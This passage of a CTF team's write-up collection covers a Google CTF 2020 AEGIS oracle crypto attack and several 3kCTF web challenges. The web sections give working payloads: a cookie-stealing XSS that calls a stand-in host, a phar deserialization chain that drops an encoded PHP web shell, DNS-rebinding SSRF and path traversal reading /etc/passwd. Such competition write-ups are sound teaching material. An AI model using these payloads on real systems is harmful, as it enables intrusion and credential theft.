\\wedge s^{(1)}_{23}) \\oplus s^{(1)}_{21} \\oplus s^{(1)}_{26} \\right] \\oplus \\left[ (s^{(2)}_{22} \\wedge s^{(2)}_{23}) \\oplus s^{(2)}_{21} \\oplus s^{(2)}_{26} \\right] \\\\ \u0026= s^{(1)}_{21} \\oplus s^{(2)}_{21}. \\end{aligned} \\]\nAnd similarly $k^{(1)}_{21} \\oplus k^{(2)}_{21} = s^{(1)}_{25} \\oplus s^{(2)}_{25}$.\nWhy is it useful? Let's define a new function, p:\ndef p(s: block) -\u0026gt; block: t0 = (te0[s[0]] ^ te1[s[5]] ^ te2[s[10]] ^ te3[s[15]]) t1 = (te0[s[4]] ^ te1[s[9]] ^ te2[s[14]] ^ te3[s[3]]) t2 = (te0[s[8]] ^ te1[s[13]] ^ te2[s[2]] ^ te3[s[7]]) t3 = (te0[s[12]] ^ te1[s[1]] ^ te2[s[6]] ^ te3[s[11]]) return _block_from_ints([t0, t1, t2, t3]) Déjà vu? It is more or less the same with AESEnc. We can state that AESEnc(s, t) == p(s) ^ t too. Looking even more closely, one could observe that the first four bytes from p solely depends on bytes 0, 5, 10 and 15 from s.\nKnowing this, we can further expand $k^{(1)}_{20} \\oplus k^{(2)}_{20}$:\n\\[\\begin{aligned} k^{(1)}_{20} \\oplus k^{(2)}_{20} \u0026= s^{(1)}_{21} \\oplus s^{(2)}_{21} \\\\ \u0026= \\text{AESEnc}(s^{(1)}_{10}, s^{(1)}_{11}) \\oplus \\text{AESEnc}(s^{(2)}_{10}, s^{(2)}_{11}) \\\\ \u0026= p(s^{(1)}_{10}) \\oplus s^{(1)}_{11} \\oplus p(s^{(2)}_{10}) \\oplus s^{(2)}_{11} \\\\ \u0026= p(s^{(1)}_{10}) \\oplus p(s^{(2)}_{10}) \\\\ \u0026= p\\left(\\text{AESEnc}(s^{(1)}_{07}, s^{(1)}_{00}) \\oplus m^{(1)}_{00}\\right) \\oplus p\\left(\\text{AESEnc}(s^{(2)}_{07}, s^{(2)}_{00}) \\oplus m^{(2)}_{00}\\right) \\\\ \u0026= p(x \\oplus m^{(1)}_{00}) \\oplus p(x \\oplus m^{(2)}_{00}). \\end{aligned}\\]\n(We define $x := \\text{AESEnc}(s_{07}, s_{00}) = s_{10} \\oplus m^{(1)}_{00}$ for ease of reading.)\nAnd now the only unknown is $x$. Can we solve it easily? Yes indeed: we can compute bytes 0, 5, 10, 15 of $x$ from the first four bytes of $k^{(1)}_{20} \\oplus k^{(2)}_{20}$. Along with three more equalities from p, we are able to recover $x$ completely. I used an meet-in-the-middle approach to solve for $x$ in five seconds.\n  But wait. There is a problem: I am able to find 65536 candidates (or even more) instead of 1, but I am unable to eliminate the rest. The possible number of states will be growing exponentally! What can I do? The solution is actually simple: Just send $M^{(3)}$ and compute another solution set of $x$. After all, it is very likely that $x$ is the only element in the intersection of the two sets. With $x$, we are able to compute $s_{10}$ (respectively $s_{14}$).\nPart III: Finishing the first part of the challenge We can extend the above idea to leak more. By sending two 128-byte messages with blocks 3 and 4 being different, we are able to recover $s_{20}$ and $s_{24}$. We are able to leak $s_{30}$ and $s_{34}$ with the same idea.\nTwo more questions remain: How is it made possible in seven queries? And more importantly, how can we recover $s_{ij}$ for all $j$, for some $i$ (preferably $i = 0\\ \\text{or}\\ 1$)?\nChallenge 1. Recover the above states in 7 queries.\nIn short, we are encrypting these seven plaintexts (each 0 represents 16 \\x00's, etc):\n 0000000000 0000110000 0000220000 - Derive $s_{10}$ and $s_{14}$ uniquely with (1) and (2) 0000001100 0000002200 - Derive $s_{20}$ and $s_{24}$ uniquely with (1) and (4) 0000000011 0000000022 - Derive $s_{30}$ and $s_{34}$ uniquely with (1) and (6)  Challenge 2. Recover $s_{1, j}$ for all $j$.\nFrom above, we are able to derive $s_{i, 0}$ and $s_{i, 4}$ for $i = 1, 2, 3$ with $m_{ij} = 0$. Hence, the state transition would be $s_{i+1, j} \\leftarrow p(s_{i, j-1}) \\oplus s_{ij}$ for all $i, j$. Equivalently $s_{i, j-1} = p^{-1}(s_{i+1, j} \\oplus s_{ij})$.\nWe are able to compute inverses of $p^{-1}$ easily. Solving system of linear equations would be all good, but I'm doing it with meet-in-the-middle. Code reuse for the win! For now, let's visualize how $s_{1, j}$'s can be derived.\ndigraph { rankdir=BT s₁₀[fillcolor=yellow,style=filled] s₁₄[fillcolor=yellow,style=filled] s₂₀[fillcolor=yellow,style=filled] s₂₄[fillcolor=yellow,style=filled] s₃₀[fillcolor=yellow,style=filled] s₃₄[fillcolor=yellow,style=filled] s₂₀ -\u0026gt; s₂₇ s₃₀ -\u0026gt; s₂₇ s₂₄ -\u0026gt; s₂₃ s₃₄ -\u0026gt; s₂₃ s₁₄ -\u0026gt; s₁₃ s₂₄ -\u0026gt; s₁₃ s₁₃ -\u0026gt; s₁₂ s₂₃ -\u0026gt; s₁₂ s₁₀ -\u0026gt; s₁₇ s₂₀ -\u0026gt; s₁₇ s₁₇ -\u0026gt; s₁₆ s₂₇ -\u0026gt; s₁₆ s₁₂ -\u0026gt; s₁₁ s₁₃ -\u0026gt; s₁₁ s₁₆ -\u0026gt; s₁₁ s₁₆ -\u0026gt; s₁₅ s₁₇ -\u0026gt; s₁₅ s₁₂ -\u0026gt; s₁₅ } After all, the first part of the challenge is done.\nPart IV: AEGIS-128 vs AEGIS-128L For the second part, AEGIS-128 is used. The state is now 80 bytes (five 16-byte blocks). The payload size has been reduced to one block (let's denote it by $m$). This is how the state transited:\n $s_{i+1, 0} \\leftarrow p(s_{i, 4}) \\oplus s_{i, 0} \\oplus m$, and $s_{i+1, j} \\leftarrow p(s_{i, j-1}) \\oplus s_{i, j}$ for $1 \\leq j \\leq 4$.  Moreover, the keystream $k_i$ for the $i$-th round is also altered: $k_i = (s_{i, 2} \\wedge s_{i, 3}) \\oplus s_{i, 1} \\oplus s_{i, 4}$.\nPart V: Exploring the challenge I have no idea what's going on, so I decided to recover the printable secret_plaintext first.\nIt is pretty easy, and is made possible because we are able to receive the error from the oracle. In particular, from pt.decode(\u0026quot;ascii\u0026quot;).\nWe are able to recover the plaintext with bit-flipping. To begin with, we can flip the whole ciphertext by \\x80. The first 32 bytes for the plaintext would be flipped by \\x80 as well. If we send the flipped ciphertext (denote by $c_?$) to the oracle, we will obtain:\nUnicodeDecodeError: \u0026#39;ascii\u0026#39; codec can\u0026#39;t decode byte 0xe7 in position 0: ordinal not in range(128) This means that the first byte of the flipped plaintext would be \\xe7. Hence, the first byte of the plaintext is \\x67 (g). We then flip the first byte of $c_?$ by \\x80 and send it to the oracle, we will be receiving another error:\nUnicodeDecodeError: \u0026#39;ascii\u0026#39; codec can\u0026#39;t decode byte 0xc6 in position 1: ordinal not in range(128) This recovers the second byte - x46 (F). Since the secret plaintext is 96-byte long, we can recover it with 96 oracle calls.\nREMAINING ORACLE CALLS: 231 - 96 = 135.\nWith a plaintext recovered, it is time for us to try to recover the internal state. Can we devise a similar strategy that is similar to the first part of the challenge? Formally, what will happen if we have two 48-byte messages $M^{(1)} := (m^{(1)}_0, m^{(1)}_1, m^{(1)}_2)$ and $M^{(2)} := (m^{(2)}_0, m^{(2)}_1, m^{(2)}_2)$ with only the first block being different. Then the last 16 bytes in the keystream will be:\n\\[ \\begin{aligned} k^{(1)}_2 \\oplus k^{(2)}_2 \u0026= \\left[ (s^{(1)}_{22} \\wedge s^{(1)}_{23}) \\oplus s^{(1)}_{21} \\oplus s^{(1)}_{24} \\right] \\oplus \\left[ (s^{(2)}_{22} \\wedge s^{(2)}_{23}) \\oplus s^{(2)}_{21} \\oplus s^{(2)}_{24} \\right] \\\\ \u0026= s^{(1)}_{21} \\oplus s^{(2)}_{21} \\\\ \u0026= p(s^{(1)}_{10}) \\oplus s^{(1)}_{11} \\oplus p(s^{(2)}_{10}) \\oplus s^{(2)}_{11} \\\\ \u0026= p(s^{(1)}_{10}) \\oplus p(s^{(2)}_{10}) \\\\ \u0026= p\\left(\\text{AESEnc}(s^{(1)}_{04}, s^{(1)}_{00}) \\oplus m^{(1)}_1\\right) \\oplus p\\left(\\text{AESEnc}(s^{(2)}_{04}, s^{(2)}_{00}) \\oplus m^{(2)}_1\\right) \\\\ \u0026= p(x \\oplus m^{(1)}_0) \\oplus p(x \\oplus m^{(2)}_0). \\end{aligned} \\]\nHereby denote $x := \\text{AESEnc}(s_{04}, s_{00}) = s_{10} \\oplus m^{(1)}_0$. Simply put, if we have the ciphertexts for $M^{(1)}$ and $M^{(2)}$ (denote it as $C^{(k)} = (c^{(k)}_0, c^{(k)}_1, c^{(k)}_2)$), we are able to recover one-fifths of the state if this happens.\nHow are we able to do it? Well actually, we have recovered the secret plaintext above. We can flip the first block of the ciphertext arbitrarily (to $C_?$).\nHowever, since $k^{(2)}_2$ is altered, the third block of the message would be updated. Luckily we are able to recover the message in 17 oracle calls. Here's how:\n Sends $C_?$. We will obtain something like this: UnicodeDecodeError: 'ascii' codec can't decode byte 0xe8 in position 34... Flips the 35th byte by \\xe8 in $C_?$. Sends the patched $C_?$: UnicodeDecodeError: 'ascii' codec can't decode byte 0xcb in position 35... Flips the 36th byte by \\xcb in $C_?$. Repeat the process until we receive OK, meaning that the plaintext is now ASCII-encoded. For now, we have recovered a subset of message bytes. We then flip the unknown bytes by \\x80 (for example, bytes 33 and 34) to throw errors from the oracle. Repeat step 1 until all unknown bytes are recovered.  In short, we spent 16 oracle calls to recover the message, and one oracle call to indicate us to flip all the bytes those were originally printable. We are then able to recover a possible set of $s_{10}$ with 65536 entries (or more). We can spend another 17 queries to find the actual $s_{10}$, however.\nREMAINING ORACLE CALLS: 135 - 17\u0026times;2 = 101.\nWith the same idea, we can recover $s_{20}, s_{30}, s_{40}$ with 17\u0026times;6 queries. This would allow us to recover $s_{10}, s_{11}, ..., s_{14}$ and hence forging arbitrary messages (along with a slightly longer AD).\nREMAINING ORACLE CALLS: 101 - 17\u0026times;6 = -1.\nShoot - we are one query short. Since we are able to recover one byte of the plaintext in each of the queries, so it doesn't hurt to sacrifice one oracle calls by guessing one byte. So... in theory, we are able to finish the challenge with once every 256 times.\nLuckily, if we are given a incorrect plaintext (actually keystream), we are unable to recover a single $s_*$. That's pretty good, we are able to solve the challenge every time.\nREMAINING ORACLE CALLS: -1 + 1 = :tada:.\nWith the exploit script written, I am able to reach the very end locally. Congratulations to me!\nPart IV: Wait... Aren't we done? No... When I am interacting to the server, I am always disconnected while sending one of the 231 oracle calls. Asking the organizers in IRC, knowing that there was an 1-minute timeout - it was later increased to 10 minutes. Unfortunately, my solution runs for around 5 minutes. I have two choices:\n Wait until the challenge has a 10-minute timeout, or Optimize the script and have it completed in one minute.  Seeing that there are already few teams solving the challenge, I think (2) would be fun.\n6.1. Reducing online complexity For inputs that does not require immediate feedbacks, we can send them at the same time. This is an example when I am recovering secret_plaintext in the second part.\n# Before optimization test_ciphertext = bytes([c^0x80 for c in ciphertext]) m0 = b\u0026#39;\u0026#39; for i in range(96): r.sendline(base64.b64encode(test_ciphertext)) test_ciphertext = cxor(test_ciphertext, i, 0x80) p, mc = try_decrypt_read(r) assert p == i m0 += bytes([mc^0x80]) # After optimization test_ciphertext = bytes([c^0x80 for c in ciphertext]) m0 = b\u0026#39;\u0026#39; for i in range(96): r.sendline(base64.b64encode(test_ciphertext)) test_ciphertext = cxor(test_ciphertext, i, 0x80) for i in range(96): p, mc = try_decrypt_read(r) assert p == i m0 += bytes([mc^0x80]) 6.2. Reducing offline complexity For example, this is the method I implemented to solve for $x$ from $p(x \\oplus a) \\oplus p(x \\oplus b) = c$ - it takes one second each time:\ndef px_subsolve(a_sub, b_sub, c_sub): # Given a_sub, b_sub, c_sub (4 bytes), find x_sub such that # te0[(x_sub ^ a_sub)[0]] ^ te1[(x_sub ^ a_sub)[1]] ^ te2[(x_sub ^ a_sub)[2]] ^ te3[(x_sub ^ a_sub)[3]] # ^ te0[(x_sub ^ a_sub)[0]] ^ te1[(x_sub ^ a_sub)[1]] ^ te2[(x_sub ^ a_sub)[2]] ^ te3[(x_sub ^ a_sub)[3]] # = c_sub # Reformulating: # te0[(x_sub ^ a_sub)[0]] ^ te1[(x_sub ^ a_sub)[1]] ^ te0[(x_sub ^ a_sub)[0]] ^ te1[(x_sub ^ a_sub)[1]] ^ c_sub # = te2[(x_sub ^ a_sub)[2]] ^ te3[(x_sub ^ a_sub)[3]] ^ te2[(x_sub ^ a_sub)[2]] ^ te3[(x_sub ^ a_sub)[3]] lhss = {} for x0, x1 in itertools.product(range(256), repeat=2): # LHS xs = [be0[x0^a_sub[0]], be0[x0^b_sub[0]], be1[x1^a_sub[1]], be1[x1^b_sub[1]], c_sub] y = reduce(_xor, xs) lhss[y] = lhss.get(y, []) + [(x0, x1)] solns = [] for x2, x3 in itertools.product(range(256), repeat=2): # RHS xs = [be2[x2^a_sub[2]], be2[x2^b_sub[2]], be3[x3^a_sub[3]], be3[x3^b_sub[3]]] y = reduce(_xor, xs) for x0, x1 in lhss.get(y, []): solns.append(bytes([x0, x1, x2, x3])) return solns However, if we force a_sub == b'\\0'*4 and b_sub == b'\\1'*4 or b_sub == b'\\2'*4, the right hand side can be precomputed. We are able to solve for $x$ once every 0.2 second.\nAt last - we are able to get the flag in 30 seconds locally and around 55 seconds online! :tada:\n Credits  Thanks @harrier_lcc who noticed that my lever did not hurt. Playing Minecraft too much, I misspelt liver. Thanks @hellman1908 for pointing that we are able to bruteforce byte by byte instead of bruteforcing columns, since that we can apply MixColumns inverse.  ","permalink":"https://b6a.black/posts/2020-08-25-google-ctf-oracle/","summary":"I was teamed-up with @blackb6a on Google CTF this time. I have solved 7 challenges alone and 3 challenges with my teammates.\nIn particular, Oracle is a crypto challenge with 13 solves. It has got me spending 12 hours. All in all, it was a great experience in terms of learning, but my liver hurts. This piece of writeup may be very computation intensive, just because I would like to make everything clear.","title":"Google CTF 2020: Oracle"},{"content":"reporter (Web; 498 points) Solved by apple.\nAuthor: rekter0\n Reporter is an online markdown reporting tool. it's free to use for everyone. there's a secret report we need located here\nsource\n Walkthrough The application provide markdown hosting service and it will automatically download and embed external images (or any files) to the 'report'.\nThere are 4 buttons on the interface: Edit, Preview, Save, and Deliver.\nThe first target of the challenge is to access the secret_report.\ncurl http://reporter.3k.ctf.to/secret_report \u0026lt;!DOCTYPE HTML PUBLIC \u0026#34;-//IETF//DTD HTML 2.0//EN\u0026#34;\u0026gt; \u0026lt;html\u0026gt;\u0026lt;head\u0026gt; \u0026lt;title\u0026gt;403 Forbidden\u0026lt;/title\u0026gt; ... Well, knew that.\nExploiting TOCTOU of the domain checking Interesting things happen in backend.php.\nif(@$_POST[\u0026#39;deliver\u0026#39;]){ $thisDoc=file_get_contents($dir.\u0026#39;/file.html\u0026#39;); $images = preg_match_all(\u0026#34;/\u0026lt;img src=\\\u0026#34;(.*?)\\\u0026#34; /\u0026#34;, $thisDoc, $matches); foreach ($matches[1] as $key =\u0026gt; $value) { $thisDoc = str_replace($value , \u0026#34;data:image/png;base64,\u0026#34;.base64_encode(fetch_remote_file($value)) , $thisDoc ) ; } When user click on the deliver button it will get the saved document, fetch_remote_file and embed it to the report with base64. Therefore users can embed images from external image hosting sites such as imgur etc.\nHow about embedding the secret_report? It does not work as it do a long list of checks:\nfunction fetch_remote_file($url) { $config[\u0026#39;disallowed_remote_hosts\u0026#39;] = array(\u0026#39;localhost\u0026#39;); $config[\u0026#39;disallowed_remote_addresses\u0026#39;] = array(\u0026#34;0.0.0.0/8\u0026#34;, \u0026#34;10.0.0.0/8\u0026#34;, \u0026#34;100.64.0.0/10\u0026#34;, \u0026#34;127.0.0.0/8\u0026#34;, \u0026#34;169.254.0.0/16\u0026#34;, \u0026#34;172.16.0.0/12\u0026#34;, \u0026#34;192.0.0.0/29\u0026#34;, \u0026#34;192.0.2.0/24\u0026#34;, \u0026#34;192.88.99.0/24\u0026#34;, \u0026#34;192.168.0.0/16\u0026#34;, \u0026#34;198.18.0.0/15\u0026#34;, \u0026#34;198.51.100.0/24\u0026#34;, \u0026#34;203.0.113.0/24\u0026#34;, \u0026#34;224.0.0.0/4\u0026#34;, \u0026#34;240.0.0.0/4\u0026#34;,); // ... $addresses = get_ip_by_hostname($url_components[\u0026#39;host\u0026#39;]); $destination_address = $addresses[0]; // ... checks if the destination_address is in the disallowed list ... $opts = array(\u0026#39;http\u0026#39; =\u0026gt; array(\u0026#39;follow_location\u0026#39; =\u0026gt; 0,)); $context = stream_context_create($opts); return file_get_contents($url, false, $context); } function get_ip_by_hostname($hostname) { $addresses = @gethostbynamel($hostname); if (!$addresses) { // ... more attempts to get dns A records ... } return $addresses; } If we change the DNS record very quickly, which the DNS server return 1.1.1.1 at get_ip_by_hostname when it do the checking, and we return 127.0.0.1 at file_get_contents we can access the localhost and maybe we can get the secret_report.\nTherefore I wrote a script1 to act as a nameserver and give different responses.\n$ dig +short 4kctf.example.com @8.8.8.8 1.1.1.1 $ dig +short 4kctf.example.com @8.8.8.8 127.0.0.1 payload\n![](http://4kctf.example.com/secret_report/) The result is a file listing with two files:\n3ac45ca05705d39ed27d7baa8b70ecd560b69902.php secret2 63b4bacc828939706ea2a84822a4505efa73ee3e.php not much here The 3ac45ca05705d39ed27d7baa8b70ecd560b69902.php is suspicious as it have 50 bytes but only 7 bytes returned from server. Maybe the flag is there.\nWonders of PHP: empty(\u0026quot;0\u0026quot;) == true I crafted this payload to read the file and get the flag.\n![](0:/../secret_report/3ac45ca05705d39ed27d7baa8b70ecd560b69902.php) Back to the backend.php fetch_remote_file, besides DNS checking it also parse_url and checks scheme, port, etc.\nfunction fetch_remote_file($url) { // ... $url_components = @parse_url($url); if (!isset($url_components[\u0026#39;scheme\u0026#39;])) { return false; } if (@($url_components[\u0026#39;port\u0026#39;])) { return false; } if (!$url_components) { return false; } if ((!empty($url_components[\u0026#39;scheme\u0026#39;]) \u0026amp;\u0026amp; !in_array($url_components[\u0026#39;scheme\u0026#39;], array(\u0026#39;http\u0026#39;, \u0026#39;https\u0026#39;)))) { return false; } if (array_key_exists(\u0026#34;user\u0026#34;, $url_components) || array_key_exists(\u0026#34;pass\u0026#34;, $url_components)) { return false; } // ... return file_get_contents($url, false, $context); parse_url will parse as follows\narray(2) { [\u0026#34;scheme\u0026#34;]=\u0026gt; string(1) \u0026#34;0\u0026#34; [\u0026#34;path\u0026#34;]=\u0026gt; string(62) \u0026#34;/../secret_report/3ac45ca05705d39ed27d7baa8b70ecd560b69902.php\u0026#34; } Where the scheme will return true for isset and true for empty (empty(\u0026quot;0\u0026quot;) == true), and for file_get_contents it will recognize 0: as a folder and 0:/../ as current folder.\nxsser (Web; 499 points) Solved by ozetta.\nDescription  challenge\nAuthor: Dali\n Walkthrough Source code is provided:\n\u0026lt;?php include(\u0026#39;flag.php\u0026#39;); class User { public $name; public $isAdmin; public function __construct($nam) { $this-\u0026gt;name = $nam; $this-\u0026gt;isAdmin=False; } } ob_start(); if(!(isset($_GET[\u0026#39;login\u0026#39;]))){ $use=new User(\u0026#39;guest\u0026#39;); $log=serialize($use); header(\u0026#34;Location: ?login=$log\u0026#34;); exit(); } $new_name=$_GET[\u0026#39;new\u0026#39;]; if (isset($new_name)){ if(stripos($new_name, \u0026#39;script\u0026#39;))//no xss :p  { $new_name = htmlentities($new_name); } $new_name = substr($new_name, 0, 32); echo \u0026#39;\u0026lt;h1 style=\u0026#34;text-align:center\u0026#34;\u0026gt;Error! Your msg \u0026#39;.$new_name.\u0026#39;\u0026lt;/h1\u0026gt;\u0026lt;br\u0026gt;\u0026#39;; echo \u0026#39;\u0026lt;h1\u0026gt;Contact admin /req.php \u0026lt;/h1\u0026gt;\u0026#39;; } if($_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;] == \u0026#39;127.0.0.1\u0026#39;){ setcookie(\u0026#34;session\u0026#34;, $flag, time() + 3600); } $check=unserialize(substr($_GET[\u0026#39;login\u0026#39;],0,56)); if ($check-\u0026gt;isAdmin){ echo \u0026#39;welcome back admin \u0026#39;; } ob_end_clean(); show_source(__FILE__);  From the challenge name it is about XSS. After setting $_GET['login'], you can enter something in $_GET['new'], which is supposed to be reflected on the page for XSS.\nThanks to ob_start(); and ob_end_clean();, nothing about the user input are printed in the normal case.\nTo address this, we can make the interpreter panic before ob_end_clean();. Maybe unserialize could do so?\nBut most of the time unserialize just returns FALSE when you input some garbage that is \u0026quot;un-unserialize-able\u0026quot; (pun intended)\nLet's try to unserialize some meaningful junks:\n\u0026lt;?php foreach (get_declared_classes() as $c) { unserialize(\u0026#39;O:\u0026#39;.strlen($c).\u0026#39;:\u0026#34;\u0026#39;.$c.\u0026#39;\u0026#34;:0:{}\u0026#39;); }  It shows Fatal error: Uncaught Error: Invalid serialization data for DateTime object. So DateTime should do the trick.\nHow about the actual XSS payload? We can't use \u0026lt;script src=//blah\u0026gt;\u0026lt;/script\u0026gt;.\nFor some reason script\u0026lt;script src=//blah\u0026gt;\u0026lt;/script\u0026gt; could bypass that stripos but it is too long.\nLater on I found that /req.php accepts external URLs as well. So we can use some other tricks like window.name:\n\u0026lt;script\u0026gt;name=\u0026#39;location=\u0026#34;//blah/\u0026#34;+document.cookie\u0026#39;;location=\u0026#39;//127.0.0.1/?new=%3Cbody%20onload=eval(name)%3E\u0026amp;login=O:8:%22DateTime%22:0:%7B%7D\u0026#39;;\u0026lt;/script\u0026gt; Remarks At first I tried the payload with iframe but Chrome blocks the Set-Cookie header due to \u0026quot;third-party cookies preference\u0026quot;.\nThen I tried the payload with form and Chrome blocks the popup as expected. But for some reason the Headless Chrome works.\nimage uploader (Web; 498 points) Solved by ozetta.\nDescription  challenge\nsource\nAuthor: Dali\n 題解 (Walkthrough) 我知你睇唔明廣東話架啦. 今次有翻譯.\n I know you don't understand Cantonese. This time got translation.\n 個 description 得兩條奸笑5678. 是但啦有醬油有計傾.\n (Some unimportant gibberish)\n 一開 index.php 就見到 include('old.php');//todo remove this useless file :\\\n After opening index.php then we can see that include stuff...\n 明眼人一睇就知係伏啦. 一睇兩個 Class 重唔係玩 unserialize.\n Obviously it is the vulnerable point. It contains 2 classes so obviously it is about unserialize.\n 碌落 D (唔好譯啦你譯唔到個 D 架啦) 個 index.php 見到 file_get_contents. 條件反射 phar unserialize\n Scroll down [Don't translate that \u0026quot;D\u0026quot;, you can't] that index.php, we can see file_get_contents. It immediately links to phar unserialize\n 有個 upload.php 真係可以 upload 野. 不過會 check getimagesize 同 image/jpeg\n There is an upload.php that can really upload things. But it checks with getimagesize and image/jpeg.\n 睇返個 old.php, 又係驗眼嘅時間. 最底有個 $data = \u0026quot;\u0026lt;?php\\n//\u0026quot; . sprintf('%012d', $expire) . \u0026quot;\\n exit();?\u0026gt;\\n\u0026quot; . $data; 但係無咩用.\n Let's go back to old.php and check our eyesight. The bottom $data = \u0026quot;\u0026lt;?php... looks interesting but unless.\n 除非個 sprintf('%012d', $expire) 可以整走個 exit() 啦.\n Unless sprintf('%012d', $expire) could be used to get rid of that exit().\n 再碌上 D 見到個詭異嘅 variable function return $serialize($data);. 咁開心.\n Scroll up a bit then we can see a weird variable function return $serialize($data);. So exciting.\n 所以如果將 $this-\u0026gt;options['serialize'] 改做 system 就可以行 system.\n So if we set $this-\u0026gt;options['serialize'] to system then we could run system.\n 但係個 $data 要點砌呢. 根據所謂 POP 可以 trace 到:\n But how can we control $data? According to the so-called Property-Oriented Programming, you can trace like this:\n $this-\u0026gt;options['serialize']($data) //cl2-\u0026gt;serialize\n=\u0026gt; $this-\u0026gt;serialize($value) //cl2-\u0026gt;set\n=\u0026gt; $this-\u0026gt;store-\u0026gt;set($this-\u0026gt;key, $this-\u0026gt;getForStorage(), $this-\u0026gt;expire); //cl1-\u0026gt;save\n=\u0026gt; return json_encode([$this-\u0026gt;cleanContents($this-\u0026gt;cache), $this-\u0026gt;complete]); //cl1-\u0026gt;getForStorage()\n首先個 $data 有少少限制. 因為係 json_encode 個 Array.\n First, the $data is a bit restricted. Because it is constructed by json_encode-ing an array.\n 不過你想用 system 行 command 其實可以好求其. 好似咩 $(ls).\n But if you just need to use system to execute command, it is pretty flexible. Like using $(ls).\n 最後可以砌到好似 system('[\u0026quot;$(ls)\u0026quot;,0]').\n At the end of the day we should be able to construct like system('[\u0026quot;$(ls)\u0026quot;,0]').\n 要 trigger cl1-\u0026gt;save, destructor 個 $this-\u0026gt;autosave 要 false.\n If you want to trigger cl1-\u0026gt;save, in the destructor, $this-\u0026gt;autosave should be false.\n 依家有齊啲餡啦. 要搵返 phar 個 payload.\n We are cooking with gas. Now we need to get the phar payload.\n 邊鬼個會記得點寫. 抄返自己個威噏.\n Who the heck will remember how to write the payload. Just copy my own write-up.\n https://github.com/ozetta/ctf-challenges/wiki/Envy-(Tangerine)\n由 $p = new Phar('malware.phar'); 果行抄起 (好似係)\n Copy the payload starting from $p = new Phar('malware.phar');\n 上面記得抄返個 Class definition 同埋改晒 D property 佢.\n Remember to copy the class definitions and change the properties to the desired one.\n 個 getimagesize 同 image/jpeg 點算? 求其攝個 jpg 向頭咪得囉.\n How to tackle getimagesize and image/jpeg? Just inject a jpg file in front.\n  Final payload \u0026lt;?php class cl1 { protected $store; protected $key; protected $expire; public function __construct($store, $key = \u0026#39;flysystem\u0026#39;, $expire = null) { $this-\u0026gt;key = $key; $this-\u0026gt;store = $store; $this-\u0026gt;expire = $expire; //add your own properties $this-\u0026gt;cache = [\u0026#39;$(echo PD89YCRfR0VUWzBdYDs= | base64 -d \u0026gt; /var/www/html/up/z.php)\u0026#39;]; $this-\u0026gt;autosave = 0; $this-\u0026gt;complete = 0; } } class cl2 { public function __construct(){ //add your own properties $this-\u0026gt;options[\u0026#39;serialize\u0026#39;] = \u0026#34;system\u0026#34;; $this-\u0026gt;writeTimes = 0; $this-\u0026gt;options[\u0026#39;prefix\u0026#39;] = \u0026#39;\u0026#39;; $this-\u0026gt;options[\u0026#39;data_compress\u0026#39;] = 0; } } $x = new cl1(new cl2(),\u0026#34;z\u0026#34;,0); $p = new Phar(\u0026#39;malware.phar\u0026#39;); $p-\u0026gt;startBuffering(); $p-\u0026gt;addFromString(\u0026#34;z\u0026#34;,\u0026#34;\u0026#34;); $j = file_get_contents(\u0026#34;1.jpg\u0026#34;); $p-\u0026gt;setStub($j.\u0026#34;\u0026lt;?php __HALT_COMPILER(); ? \u0026gt;\u0026#34;); $p-\u0026gt;setMetadata($x); $p-\u0026gt;stopBuffering(); $file = file(\u0026#39;malware.phar\u0026#39;);  之後 upload 個「圖」, 出返個 \u0026quot;filename.jpg\u0026quot;. 之後讀 php://filter/convert.base64-encode/resource=phar:///var/www/html/up/filename.\n Then upload that \u0026quot;image\u0026quot;, will return \u0026quot;filename.jpg\u0026quot;. Then access php://filter/convert.base64-encode/resource=phar:///var/www/html/up/filename.\n 之後點玩自己諗啦. 提示: 估下 PD89YCRfR0VUWzBdYDs= 係咩先.\n The rest is left as an exercise for the readers. (Hint: decode PD89YCRfR0VUWzBdYDs=)\n Remark \n呢題咁易都搞咗我個半鐘真係失敗。\n\nhttps://twitter.com/confus3r/status/1286850105513930752\n慘。早啲起身咪有 First Blood (好似係\ncarthagods (Web; 496 points) Author: rekter0, Dali\n Salute the carthagods!\nHints\n redacted source   Exploit The challenge provided the redacted sourcecode as hints.\n.htaccess\n... RewriteRule ^([a-zA-Z0-9_-]+)$ index.php?*REDACTED*=$1 [QSA] index.php\n... \u0026lt;?php if(@$_GET[*REDACTED*]){ $file=$_GET[*REDACTED*]; $f=file_get_contents(\u0026#39;thecarthagods/\u0026#39;.$file); if (!preg_match(\u0026#34;/\u0026lt;\\?php/i\u0026#34;, $f)){ echo $f; }else{ echo \u0026#39;php content detected\u0026#39;; } } ?\u0026gt; ...  The php script accepts user provided $file path without any sanitation, however the GET parameter is redacted.\nThe .htaccess file rewrite the path to index.php with the GET parameter. Lets try the folder thecarthagods as shown in the php file.\ncurl http://carthagods.3k.ctf.to:8039/thecarthagods We got the token\n\u0026lt;!DOCTYPE HTML PUBLIC \u0026#34;-//IETF//DTD HTML 2.0//EN\u0026#34;\u0026gt; \u0026lt;html\u0026gt;\u0026lt;head\u0026gt; \u0026lt;title\u0026gt;301 Moved Permanently\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt;\u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Moved Permanently\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;The document has moved \u0026lt;a href=\u0026#34;http://carthagods.3k.ctf.to:8039/thecarthagods/?eba1b61134bf5818771b8c3203a16dc9=thecarthagods\u0026#34;\u0026gt;here\u0026lt;/a\u0026gt;.\u0026lt;/p\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;address\u0026gt;Apache/2.4.29 (Ubuntu) Server at carthagods.3k.ctf.to Port 8039\u0026lt;/address\u0026gt; \u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt; With the token we can do path traversal\ncurl \u0026#34;http://carthagods.3k.ctf.to:8039/index.php?eba1b61134bf5818771b8c3203a16dc9=../../../../../etc/passwd\u0026#34;root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin ... However we cannot print the content of flag.php directly\ncurl \u0026#34;http://carthagods.3k.ctf.to:8039/index.php?eba1b61134bf5818771b8c3203a16dc9=../flag.php\u0026#34;\u0026lt;textarea class=\u0026#34;label-input100\u0026#34; style=\u0026#34;color:black;width: 100%;height: 300px;\u0026#34;\u0026gt;php content detected \u0026lt;/textarea\u0026gt; From the phpinfo provided we can know opcache is enabled, with opcache.file_cache set to /var/www/cache/. Maybe we can get the compiled version of flag.php and get its content.\nThe opcache will store the cache in the format /var/www/cache/\u0026lt;system_id\u0026gt;/path/to/file.php.bin, with system ID generated from PHP version, 